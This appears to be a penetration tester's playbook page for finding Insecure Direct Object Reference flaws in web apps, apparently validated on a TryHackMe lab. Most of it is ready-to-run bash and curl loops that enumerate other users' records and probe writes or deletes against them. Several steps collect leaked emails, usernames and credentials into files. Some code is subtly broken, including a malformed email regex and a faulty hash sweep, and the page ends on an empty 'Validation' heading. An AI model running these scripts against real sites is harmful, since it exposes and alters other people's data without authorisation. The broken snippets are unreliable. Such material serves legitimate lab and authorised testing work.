
> **STATUS: AUDITED** — first-principles + primary-source derivation (OWASP WSTG-ATHZ-04, PortSwigger Access Control, bug bounty consensus); sub-block 1 (numeric-sequential URL) live-validated on THM:Guided Pentest: Web; sub-block 7 partially validated (single-payload probe returned UNCHANGED); sub-blocks 2-6 structural audit only, unvalidated pending future boxes hitting their variants. Last audit: 2026-09-09.

Insecure Direct Object Reference. Server retrieves or mutates a resource based on client-supplied input without re-checking that the current session is authorised for THAT specific resource.

Insecure Direct Object Reference. Server retrieves or mutates a resource based on client-supplied input without re-checking that the current session is authorised for THAT specific resource. Manipulating the reference reveals or modifies other principals' data. Subclass of Broken Access Control (OWASP A01:2021).

⚠️ Where commands include `-b '<session_cookie>'`: authed callers use as-shown; unauth callers omit the flag entirely.

⚠️ Where commands include `-b '<session_cookie_a>'` / `<session_cookie_b>`: only fires from AW sub-block 3 (horizontal-priv, two walked creds). Ignore two-cookie variants otherwise.

---

## Pre-flight (per URL)

Fires per candidate URL from caller. Loop by hand — one URL, walk pre-flight + matching sub-block(s), collect hits, next URL.
### Variables

Browse the URL under test in Firefox with session (if authed caller). Observe and set, as appropriate:

#### Always Set/On:

- `<url_path>` — path portion of URL under test (e.g. `/profile.php?id=7`, `/user/7/profile`, `/api/messages/eyJpZCI6N30=`)
- `<self_value>` — the reference value naturally used by current session (e.g. `7`, `eyJpZCI6N30=`)

#### Set if Route branch A fires (URL reference — sub-blocks 1-4 or 7):

- `<url_template>` — `<url_path>` with the reference value swapped for literal `REF` (e.g. `/profile.php?id=7` → `/profile.php?id=REF`, `/user/7/profile` → `/user/REF/profile`)

#### Set if Route branch B fires (POST/PUT body reference — sub-block 5):

- `<body_template>` — full POST/PUT body with the body-id-field value replaced by literal `REF` (capture via Firefox DevTools → Network → Copy → Copy as cURL, then substitute)
- `<body_id_name>` — the body field name holding the id (e.g. `user_id`, `owner_id`)

#### Set if Route branch C fires (header or cookie reference — sub-block 6):

- `<header_name>` — custom header name holding the id (header path only, e.g. `X-User-Id`)
- `<cookie_name>` — cookie name holding the id (cookie path only, e.g. `user_id`)

#### Set if AW sub-block 3 invoked with two walked creds:

- `<session_cookie_a>` / `<session_cookie_b>` — two session cookies for horizontal-priv testing

#### Set for sub-block 7 (fires only after a sub-block 1-6 hit):

- `<hit_ref>` — the reference value confirmed by the hitting sub-block to belong to a resource the current session should not access (another user's record, another user's message, another account's invoice, etc.).

### Route

Reference lives in one of four places — fire every matching sub-block (multiple may fire for one URL):

**A. Reference in URL (query string or path segment)** — classify `<self_value>` by format. Eyeball first — under pressure most values are visually obvious (`7` = numeric, `550e8400-e29b-41d4-a716-446655440000` = UUID, `eyJ...` with two dots = JWT). If uncertain, paste this classifier:

```bash
v='<self_value>'
if   [[ "$v" =~ ^[0-9]+$ ]];                                                                                      then echo numeric
elif [[ "$v" =~ ^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$ ]];                 then echo uuid
elif [[ "$v" == *.*.* ]] && [[ "$v" =~ ^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$ ]];                       then echo jwt
elif [[ "$v" =~ ^[a-fA-F0-9]{32}$ ]];                                                                             then echo md5
elif [[ "$v" =~ ^[a-fA-F0-9]{40}$ ]];                                                                             then echo sha1
elif [[ "$v" =~ ^[a-fA-F0-9]{64}$ ]];                                                                             then echo sha256
elif [[ "$v" =~ ^[A-Za-z0-9+/]+=*$ ]];                                                                            then echo base64
elif [[ "$v" =~ ^[A-Za-z0-9_-]+=*$ ]];                                                                            then echo base64_urlsafe
else                                                                                                                   echo opaque
fi
```

Route by format (+ sub-block 7 is always on):
- `numeric` → sub-block 1
- `base64` / `base64_urlsafe` → sub-block 2
- `md5` / `sha1` / `sha256` → sub-block 3
- `uuid` / `opaque` → sub-block 4 (leak-hunt-then-substitute)
- `jwt` → [[Session Cookie Attacks]] (JWT tampering branch — out of IDOR scope)

⚠️ False positives: short strings like `admin` classify as `base64` (alphabet match), `1234-5678` as `base64_urlsafe`. If sub-block 2's decode step returns gibberish, treat as opaque.

**B. Reference in POST/PUT body** — sub-block 5. Format classification not needed at pre-flight; sub-block 5 handles substitution inline.

**C. Reference in custom header** (`X-User-Id`, `X-Owner`, `X-Auth-User`) **or cookie** (`user_id`, `uid`, `owner`) — sub-block 6. Format classification not needed at pre-flight; sub-block 6 handles substitution inline.

---
## 1. Numeric-sequential URL enumeration

Baseline + integer-sweep classifier. Substitute integers, extract signal per response, spot outliers with distinct signals.

⚠️ Under high sweep counts (500+) sequential requests may trip rate limits or WAF. If responses degrade mid-sweep, add `sleep 0.2` in loop.

```bash
TEMPLATE='<url_template>'                                    
SELF=<self_value>                                            
UPPER=$(( SELF * 2 > 100 ? SELF * 2 : 100 ))                 
for i in $(seq 1 "$UPPER"); do
  url="${TEMPLATE//REF/$i}"
  tmp=$(mktemp)
  status=$(curl -s -o "$tmp" -w '%{http_code}' -b '<session_cookie>' "http://<host>:<port>$url")
  title=$(grep -oP '(?<=<title>)[^<]+' "$tmp" | head -1)
  h1=$(grep -oP '<h1[^>]*>[^<]+' "$tmp" | head -1 | sed 's/^<h1[^>]*>//')
  emails=$(grep -oP '[\w.+-]+@[\w.-]+\.[a-zA-Z]{2,}' "$tmp" | sort -u | tr '\n' ' ')
  body_hash=$(sed 's/<[^>]*>//g' "$tmp" | tr -s '[:space:]' ' ' | md5sum | cut -c1-8)
  printf '[status=%s][id=%d][hash=%s] title="%s" h1="%s" emails="%s"\n' "$status" "$i" "$body_hash" "$title" "$h1" "$emails"
  rm -f "$tmp"
done
```

Route per output (any signal column varying between rows = candidate hit):

- All rows show status 200, all body_hashes identical, all emails/titles/h1s identical → no IDOR; server ignores param OR always returns own data → next URL
- All rows show status 403 / 404 / 302-to-login → boundary held; no IDOR → next URL
- Rows show status 200 with DISTINCT body_hashes, emails, titles, or h1s across ids → **HIT**. Proceed to Verify + extract.
- Mixed 200 (own) / 403 (denied) / 404 (nonexistent) → partial IDOR; some IDs authorised. Proceed to Verify + extract for the accessible ids only.

### Verify + extract

For each id showing distinct signal (or accessible id in the Mixed case), navigate `http://<host>:<port>/<url_at_id_N>` in Firefox (session cookie already set). Read the page.

Note everything the app exposes per user — emails, usernames, full names, roles / admin flags, employee IDs, phone numbers, department, any leaked credentials. What's exposed varies per app; don't assume just emails.

Append discovered identifiers to accumulators:

- Emails / usernames / employee IDs → `users_<host>.txt` (per WAC Username accumulator convention). One entry per line: `echo '<identifier>' >> users_<host>.txt`
- Credentials → `creds_<host>.txt` if any leaked
- Role / admin flags → note in `route_<ip>.txt` alongside the identifier (e.g. `IDOR_ADMIN: s.mitchell@recruitx.thm (id=1, role=administrator)`) — flags priority targets for the accumulator re-fire consumers
- Browser hides page content (paywall overlay, "premium" blocker, modal, JS-hidden element) → [[Reveal Client-Hidden Content]] to reveal server-sent content before extracting identifiers

Record the hit for sub-block 7:

- `<hit_ref>` — a reference value that confirmed a hit (e.g. `1`)

Then → sub-block 7.

---

## 2. Base64 / URL-safe Base64 URL enumeration

Decode the reference to reveal underlying format, enumerate at the underlying format, re-encode per iteration.

```bash
# Decode
decoded=$(echo -n '<self_value>' | base64 -d 2>/dev/null || echo -n '<self_value>' | tr '_-' '/+' | base64 -d 2>/dev/null)
echo "decoded self_value: $decoded"
```

Route per decode result:

- Decoded = numeric integer (e.g. `12345`) → treat underlying format as numeric; sweep as sub-block 1 pattern but re-encode per iteration:

```bash
TEMPLATE='<url_template>'
SELF=$decoded                                                
UPPER=$(( SELF * 2 > 100 ? SELF * 2 : 100 ))
URLSAFE=<0|1>                                                
for i in $(seq 1 "$UPPER"); do
  if [ "$URLSAFE" = 1 ]; then
    ref=$(echo -n "$i" | base64 | tr '/+' '_-' | tr -d '=')
  else
    ref=$(echo -n "$i" | base64 | tr -d '\n')
  fi
  url="${TEMPLATE//REF/$ref}"
  tmp=$(mktemp)
  status=$(curl -s -o "$tmp" -w '%{http_code}' -b '<session_cookie>' "http://<host>:<port>$url")
  title=$(grep -oP '(?<=<title>)[^<]+' "$tmp" | head -1)
  h1=$(grep -oP '<h1[^>]*>[^<]+' "$tmp" | head -1 | sed 's/^<h1[^>]*>//')
  printf '[status=%s][id=%d][ref=%s] title="%s" h1="%s"\n' "$status" "$i" "$ref" "$title" "$h1"
  rm -f "$tmp"
done
```

- Decoded = short string (e.g. `admin`, `user7`) → treat as opaque token; sub-block 4 pattern
- Decoded = structured (e.g. `{"id":7}`, `user_id=7`) → identify the id field, sweep by re-encoding with substituted id
- Decoded = gibberish → false positive from format classifier; treat as `opaque` → sub-block 4
- Decode fails on both regular and URL-safe → treat as `opaque` → sub-block 4

Route hits per sub-block 1's route section.

---

## 3. Hash-encoded URL enumeration

Server hashed an underlying value (usually numeric ID or username). Attempt to derive the hashing scheme, then brute-force preimages for candidate values, re-hash, substitute.

```bash
# Identify hash length
len=$(echo -n '<self_value>' | wc -c)
case "$len" in
  32) alg=md5 ;;
  40) alg=sha1 ;;
  64) alg=sha256 ;;
  *)  alg=unknown ;;
esac
echo "hash length: $len chars → likely $alg"

# Confirm scheme: hash your own <self_id> (from authed context) with $alg — does it match <self_value>?
# Try several candidates:
for candidate in "<self_id>" "<self_username>" "user<self_id>" "id_<self_id>"; do
  for a in md5 sha1 sha256; do
    h=$(echo -n "$candidate" | ${a}sum | cut -d' ' -f1)
    printf '%s(%s) = %s\n' "$a" "$candidate" "$h"
  done
done
```

If any generated hash matches `<self_value>` → scheme identified as `(algorithm, input format)`. Sweep by hashing substituted values:

```bash
TEMPLATE='<url_template>'
SELF=<self_id>                                               # underlying integer identified above
UPPER=$(( SELF * 2 > 100 ? SELF * 2 : 100 ))
ALG=<md5|sha1|sha256>                                        # from identification step
INPUT_FMT='<format>'                                         # e.g. '$i' (raw int) or 'user$i' (prefixed)
for i in $(seq 1 "$UPPER"); do
  ref=$(echo -n "$INPUT_FMT" | eval echo | ${ALG}sum | cut -d' ' -f1)
  url="${TEMPLATE//REF/$ref}"
  tmp=$(mktemp)
  status=$(curl -s -o "$tmp" -w '%{http_code}' -b '<session_cookie>' "http://<host>:<port>$url")
  title=$(grep -oP '(?<=<title>)[^<]+' "$tmp" | head -1)
  printf '[status=%s][i=%d][hash=%s] title="%s"\n' "$status" "$i" "$ref" "$title"
  rm -f "$tmp"
done
```

Route hits per sub-block 1's route section.

If no candidate matches `<self_value>` → hashing scheme opaque; sub-block 4 (opaque leak-hunt).

---

## 4. UUID / opaque URL enumeration

Reference is UUID or unknown-format opaque token. Blind enumeration infeasible (search space too large). Path: hunt for OTHER users' references in leak channels, then substitute discovered values.

Leak channels to check (in order — first hit yields fastest path):

- **API endpoints listing users/resources** — check known API paths for endpoints that return user lists with UUIDs:
  ```bash
  for p in /api/users /api/user /api/list /api/all /users /users.json; do
    printf '=== %s ===\n' "$p"
    curl -s -b '<session_cookie>' "http://<host>:<port>$p" | grep -oP '"[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}"'
  done | sort -u
  ```
- **Other endpoints' response bodies** — pages listing other users (search results, message threads, comment threads, participant lists) may embed UUIDs of other principals
- **HTML source hidden fields** — `<input type="hidden" name="owner_id" value="<uuid>">` on any page
- **JavaScript source** — hard-coded references, config objects containing user maps
- **Cookies / headers on other requests** — cross-user session tokens visible via Auth Walk sub-block 3 horizontal-priv check
- **Public data** — some apps expose staff UUIDs on `/about`, `/team`, `/contact` pages

Collect discovered UUIDs into `leaked_refs_<host>.txt`. For each leaked UUID, substitute into `<url_template>`:

```bash
while read ref; do
  url="${TEMPLATE//REF/$ref}"
  tmp=$(mktemp)
  status=$(curl -s -o "$tmp" -w '%{http_code}' -b '<session_cookie>' "http://<host>:<port>$url")
  title=$(grep -oP '(?<=<title>)[^<]+' "$tmp" | head -1)
  printf '[status=%s][ref=%s] title="%s"\n' "$status" "$ref" "$title"
  rm -f "$tmp"
done < leaked_refs_<host>.txt
```

Route hits per sub-block 1's route section.

No leaks found → note as tested-negative; can't sweep opaque space blindly. → next URL.

---

## 5. POST/PUT body reference

Reference lives in request body. Capture the intact authed request, substitute the id field, replay.

Firefox DevTools → Network tab → select the POST/PUT request → right-click → Copy → Copy as cURL. This gives an authed request with all headers, cookies, and body.

Identify the id-shape field in the body (common names: `id`, `user_id`, `owner_id`, `account_id`, `target`). Set `<body_id_name>` = that name, `<self_body_id_value>` = current value.

For form-encoded body (`Content-Type: application/x-www-form-urlencoded`):

```bash
BODY_TEMPLATE='<full body with <self_body_id_value> replaced by REF>'
SELF=<self_body_id_value>
UPPER=$(( SELF * 2 > 100 ? SELF * 2 : 100 ))
for i in $(seq 1 "$UPPER"); do
  body="${BODY_TEMPLATE//REF/$i}"
  tmp=$(mktemp)
  status=$(curl -s -o "$tmp" -w '%{http_code}' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -b '<session_cookie>' -d "$body" "http://<host>:<port>/<target_url_path>")
  title=$(grep -oP '(?<=<title>)[^<]+' "$tmp" | head -1)
  printf '[status=%s][id=%d] title="%s"\n' "$status" "$i" "$title"
  rm -f "$tmp"
done
```

For JSON body (`Content-Type: application/json`):

```bash
BODY_TEMPLATE='<json body with <self_body_id_value> replaced by REF>'
SELF=<self_body_id_value>
UPPER=$(( SELF * 2 > 100 ? SELF * 2 : 100 ))
for i in $(seq 1 "$UPPER"); do
  body="${BODY_TEMPLATE//REF/$i}"
  tmp=$(mktemp)
  status=$(curl -s -o "$tmp" -w '%{http_code}' -X POST -H 'Content-Type: application/json' -b '<session_cookie>' -d "$body" "http://<host>:<port>/<target_url_path>")
  first_json=$(head -c 200 "$tmp")
  printf '[status=%s][id=%d] resp="%s"\n' "$status" "$i" "$first_json"
  rm -f "$tmp"
done
```

Route hits per sub-block 1's route section, adapted (compare JSON response fields instead of title/h1 for JSON APIs).

⚠️ Write / delete methods on this endpoint → also fire sub-block 7.

---

## 6. Header / cookie reference

Reference in custom HTTP header or cookie. Substitute value, replay.

For header (e.g. `X-User-Id: 7`):

```bash
TEMPLATE='<url_template — target_url path, no REF token needed>'
HEADER_NAME='<X-User-Id>'
SELF=<self_value>
UPPER=$(( SELF * 2 > 100 ? SELF * 2 : 100 ))
for i in $(seq 1 "$UPPER"); do
  tmp=$(mktemp)
  status=$(curl -s -o "$tmp" -w '%{http_code}' -b '<session_cookie>' -H "$HEADER_NAME: $i" "http://<host>:<port>$TEMPLATE")
  title=$(grep -oP '(?<=<title>)[^<]+' "$tmp" | head -1)
  printf '[status=%s][%s=%d] title="%s"\n' "$status" "$HEADER_NAME" "$i" "$title"
  rm -f "$tmp"
done
```

For cookie (e.g. cookie named `user_id=7` alongside session cookie):

```bash
TEMPLATE='<url_template — target_url path>'
COOKIE_NAME='<user_id>'
SELF=<self_value>
UPPER=$(( SELF * 2 > 100 ? SELF * 2 : 100 ))
for i in $(seq 1 "$UPPER"); do
  tmp=$(mktemp)
  status=$(curl -s -o "$tmp" -w '%{http_code}' -b "<session_cookie>; $COOKIE_NAME=$i" "http://<host>:<port>$TEMPLATE")
  title=$(grep -oP '(?<=<title>)[^<]+' "$tmp" | head -1)
  printf '[status=%s][%s=%d] title="%s"\n' "$status" "$COOKIE_NAME" "$i" "$title"
  rm -f "$tmp"
done
```

Route hits per sub-block 1's route section.

---

## 7. Method sweep (write / delete IDOR)

Fires when any sub-block 1-6 confirms an IDOR read hit. Tests whether the endpoint also permits write / delete methods against the same reference — turning read-IDOR into write / delete-IDOR.

⚠️ Blind IDOR (server accepts write silently, no leak in response) can exist without a read-IDOR hit; not covered here. Note as future audit extension.

```bash
url='<url_template>'
url="${url//REF/<hit_ref>}"
for method in GET POST PUT PATCH DELETE OPTIONS; do
  status=$(curl -s -o /dev/null -w '%{http_code}' -X "$method" -b '<session_cookie>' "http://<host>:<port>$url")
  printf '[%s] %s\n' "$method" "$status"
done
```

Route on output:

- Only GET returns 200; others return 405 / 501 → read-only endpoint; no write/delete IDOR surface here
- Any of POST / PUT / PATCH / DELETE returns 200 / 204 → **candidate write/delete surface** (200 alone not confirmation — many apps return 200 with error pages for unsupported methods) → Verify + confirm below
- 401 / 403 on non-GET methods → boundary held for writes; only read-IDOR (if any) applies

### Verify + confirm

Fires when route landed on candidate write/delete surface. For each accepting method (PUT / POST / PATCH / DELETE), state-change probe:

```bash
before=$(curl -s -b '<session_cookie>' "http://<host>:<port>$url" | sed 's/<[^>]*>//g' | tr -s '[:space:]' ' ' | md5sum | cut -c1-8)
curl -s -o /dev/null -X <method> -b '<session_cookie>' -H 'Content-Type: application/x-www-form-urlencoded' -d 'name=IDOR_TEST_MARKER' "http://<host>:<port>$url"
after=$(curl -s -b '<session_cookie>' "http://<host>:<port>$url" | sed 's/<[^>]*>//g' | tr -s '[:space:]' ' ' | md5sum | cut -c1-8)
[ "$before" = "$after" ] && echo "UNCHANGED — no write" || echo "CHANGED — write-IDOR CONFIRMED via <method>"
```
⚠️ Probe uses `name=IDOR_TEST_MARKER` as a generic payload guess. `UNCHANGED` may mean the app silently discarded the payload due to wrong field name (`full_name` / `email` / JSON body / etc.) rather than write being denied. If sub-block 1's Verify + extract showed which fields the resource exposes on read, adapt the `-d` payload to match. Not audited exhaustively — build when encountered.

Repeat with each accepting method. Any `CHANGED` = write/delete-IDOR confirmed for that method. 

Record confirmed methods (any `write-IDOR CONFIRMED` outputs) in `route_<ip>.txt`: `IDOR_WRITE: <hit_url> methods={<confirmed_list>}`.

⚠️ Real engagement scope: writing `IDOR_TEST_MARKER` to another user's resource is data mutation. CTF/lab OK. Real engagement: coordinate first.

---

## Horizontal privilege check (AW sub-block 3 caller-specific)

Only fires when [[Authenticated Walk]] sub-block 3 invokes IDOR with two walked creds (`<session_cookie_a>`, `<session_cookie_b>`).

For each `<target_url>` observed as A: replay under B's session:

```bash
tmp_a=$(mktemp); tmp_b=$(mktemp)
status_a=$(curl -s -o "$tmp_a" -w '%{http_code}' -b '<session_cookie_a>' "http://<host>:<port><target_url>")
status_b=$(curl -s -o "$tmp_b" -w '%{http_code}' -b '<session_cookie_b>' "http://<host>:<port><target_url>")
title_a=$(grep -oP '(?<=<title>)[^<]+' "$tmp_a" | head -1)
title_b=$(grep -oP '(?<=<title>)[^<]+' "$tmp_b" | head -1)
printf 'A: [status=%s] title="%s"\nB: [status=%s] title="%s"\n' "$status_a" "$title_a" "$status_b" "$title_b"
diff "$tmp_a" "$tmp_b" | head -30
rm -f "$tmp_a" "$tmp_b"
```

Route:

- B response identical (or same-shape) as A response → boundary broken; B can access A's `<target_url>` → **IDOR confirmed cross-account**. Post-enum.
- B response is 403 / 404 / login-redirect → boundary held.
- B response is 200 but shows B's own data (not A's) → server correctly re-derives object from session; no IDOR at this endpoint.

---

## Post-enum

For every HIT confirmed above:

- **Extract identifiers** from the leaked response body — usernames, emails, phone numbers, employee IDs, admin flags, roles.
- **Append usernames** to `users_<host>.txt` per [[Web Attack Checksheet#Username accumulator convention]]:

  ```bash
  grep -oP '(?<=@)[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' <hit_response> | ...   # extract emails
  # Or for username-shaped hits:
  echo '<discovered_username>' >> users_<host>.txt
  ```

- **Append credentials** (if any password / token leaked in response) to `creds_<host>.txt` per [[Web Attack Checksheet#Credential accumulator convention]].
- **Log discovery** in `route_<ip>.txt`:

  ```bash
  printf '[IDOR] APPLIED: %s via %s (extracted %d identifiers)\n' '<target_url>' '<sub-block>' '<count>' >> route_<ip>.txt
  ```

Next URL, or return to caller if all URLs walked.

---

## Return

- Any IDOR hits → return to caller
- No hits across all URLs → `printf '[IDOR] TESTED-NEGATIVE: no hits across %d URLs\n' <count> >> route_<ip>.txt` → return to caller
## Validation
